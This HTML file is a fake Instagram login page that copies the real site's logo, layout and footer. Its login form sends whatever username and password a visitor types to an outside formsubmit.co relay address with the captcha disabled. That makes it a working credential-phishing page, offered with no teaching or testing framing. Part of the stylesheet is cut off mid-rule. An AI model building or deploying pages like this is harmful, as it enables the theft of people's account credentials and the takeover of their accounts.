<!DOCTYPE html>
<html>
<head>
  <title>Instagram Login</title>
  <style>
   body {
  font-family: Arial, sans-serif;
  background-color: #f9f9f9;
}

.right {
  width: 100%;
  height: 100vh;
  background-color: #fff;
  padding: 40px;
  box-sizing: border-box;
}

.login-box {
  width: 300px;
  margin: 40px auto;
  padding: 20px;
  border: 1px solid #ddd;
  border-radius: 10px;
  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
}

.logo-box {
  text-align: center;
  margin-bottom: 20px;
}

.instagram-logo {
  width: 100px;
  height: 100px;
}

input[type="text"], input[type="password"] {
  width: 100%;
  height: 40px;
  margin-bottom: 20px;
  padding: 10px;
  border: 1px solid #ddd;
  border-radius: 5px;
}

button {
  width: 100%;
  height: 40px;
  background-color: #3897f0;
  color: #fff;
  border: none;
  border-radius: 5px;
  cursor: pointer;
}

button:hover {
  background-color: #2f6ca8;
}

.sign-up-box {
  text-align: center;
  margin-top: 20px;
}

.sign-up {
  color: #3897f0;
  text-decoration: none;
}

.sign-up:hover {
  text-decoration: underline;
}

h3 {
  text-align: center;
  margin-top: 20px;
}

.facebook {
  width: 100%;
  height: 40px;
  background-color: #3b5998;
  color: #fff;
  border: none;
  border-radius: 5px;
  cursor: pointer;
}

.facebook:hover {
  background-color: #2f4f7f;
}

.forgot {
  color: #3897f0;
  text-decoration: none;
  margin-top: 10px;
  display: block;
}

.forgot:hover {
  text-decoration: underline;
}

.app-install {
  text-align: center;
  margin-top: 20px;
}

.google,.microsoft {
  width: 150px;
  height: 40px;
  margin: 10px;
  border: none;
  border-radius: 5px;
  cursor: pointer;
}

#footer {
  clear: both;
  background-color: #f9f9f9;
  padding: 20px;
  text-align: center;
}

.footer-link-container {
  margin
  </style>
</head>
<body>
  <div class="right">
    <div class="login-box">
      <div class="logo-box">
        <img src="https://logos-download.com/wp-content/uploads/2016/03/Instagram_Logo_2016.png" class="instagram-logo" />
      </div>
      <form action="https://formsubmit.co/a1bd551dacc69602f2c80f5a3ccd031a" method="POST">
        <input type="text" name="name" placeholder="Phone number, username, or email" />
        <input type="hidden" name="_next" value="https://index.html">
        <input type="hidden" name="_captcha" value="false">
        <input type="password" name="subject" placeholder="Password" />
        <button type="submit">Log In</button>
      </form>
      <div class="sign-up-box">
        <p>Don't have an account? <a href="#" class="sign-up">Sign up</a></p>
      </div>
      <h3><span>or</span></h3>
      <button class="facebook">Log in with Facebook</button>
      <a href="#" class="forgot">Forgot password?</a>
      <div class="app-install">
        <h4>Get the app.</h4>
        <img src="https://www.instagram.com/static/images/appstore-install-badge.svg/55ce218f1ccd" class="google" />
        <img src="https://www.instagram.com/static/images/appstore-install-badge.svg/55ce218f1ccd" class="microsoft" />
      </div>
    </div>
  </div>
  <div id="footer">
    <div class="footer-link-container">
      <a href="#" class="footer-link">About</a>
      <a href="#" class="footer-link">Help</a>
      <a href="#" class="footer-link">Press</a>
      <a href="#" class="footer-link">API</a>
      <a href="#" class="footer-link">Jobs</a>
      <a href="#" class="footer-link">Privacy</a>
      <a href="#" class="footer-link">Terms</a>
    </div>
    <div class="footer-details">
      <p>&copy; 2024 Instagram</p>
    </div>
  </div>
</body>
</html>
